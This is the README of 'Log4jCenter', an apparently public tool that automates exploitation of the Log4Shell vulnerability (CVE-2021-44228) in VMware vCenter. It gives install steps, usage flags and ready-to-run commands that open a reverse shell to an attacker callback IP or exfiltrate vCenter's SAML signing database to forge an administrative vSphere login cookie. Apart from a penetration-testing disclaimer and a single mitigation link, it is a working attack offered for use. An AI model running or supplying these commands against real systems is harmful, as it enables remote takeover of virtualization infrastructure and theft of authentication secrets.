# Log4jCenter

Exploiting CVE-2021-44228 in vCenter for remote code execution and more. Blog post detailing exploitation linked below:

* COMING SOON

# Why?

Proof of concepts for this vulnerability are scattered and have to be performed manually. This repository automates the exploitation process and showcases an additional attack path that is possible after exploitation.

# Install

This repository can be used manually or with Docker.

### Manual install

To download and run the exploit manually, execute the following steps. First, ensure that Java and Maven are installed on your attacker host. To do this using apt on Debian based operating systems, run the following command:

```
apt update && apt install openjdk-11-jre maven
```

Clone the GitHub repository and install all python requirements:

```
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jCenter \
    && cd Log4jCenter && pip3 install -r requirements.txt
```

From the root of the Log4jCenter repository, compile the Rogue-Jndi project using the command below:

```
mvn package -f utils/rogue-jndi/
```

### Docker install

First, ensure that Docker is installed on your attacking host. (I am not going to walk you through doing this)

Following that, execute the following command to clone the repository and build the Docker image we will be using.

```
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jCenter \
    && cd Log4jCenter && docker build -t log4jcenter .
```

To run the container, run a command similar to the following with your command line flags appended. For example, the command below would be used to exploit vCenter and get a reverse shell. Note that the container will not catch the reverse shell. You need to create a ncat listener in a separate shell session:

```
docker run -it -v $(pwd)/loot:/Log4jCenter/loot -p 8090:8090 -p 1389:1389 log4jcenter \ 
    -t 10.100.100.1 -i 192.168.1.1 -p 4444 -r
```


# Usage

```
usage: exploit.py [-h] -t IP -i CALLBACK [-p PORT] [-e] [-r]

optional arguments:
  -h, --help            show this help message and exit
  -t IP, --target IP    vCenter Host IP
  -i CALLBACK, --ip CALLBACK
                        Callback IP for payload delivery and reverse shell.
  -p PORT, --port PORT  Callback port for reverse shell.
  -e, --exfiltrate      Module to pull SAML DB
  -r, --revshell        Module to establish reverse shell
```

# Examples

Get a reverse shell using the tool installed on your local system:

```
python3 exploit.py -t vcenter.acme.com -i 10.10.10.1 -p 4444 -r
```

Exfiltrate the SAML signing databases from within a Docker container:

```
docker run -it -v $(pwd)/loot:/Log4jCenter/loot -p 1389:1389 -p 8090:8090 log4jcenter \
    -t 10.100.100.1 -i 192.168.1.1 -e
```

# Notes

* Included in the utils directory is the repository [vcenter_saml_login](https://github.com/horizon3ai/vcenter_saml_login). You can use this in combination with the e flag to exfiltrate the vCenter SAML signing database and generate an administrative login cookie for vSphere. You will need to install requirements separately.
* For defenders, you can mitigate this issue using a patch coming soon or the workaround detailed [here](https://kb.vmware.com/s/article/87081)

# Disclaimer
This tool is designed for use during penetration testing; usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse of this program.
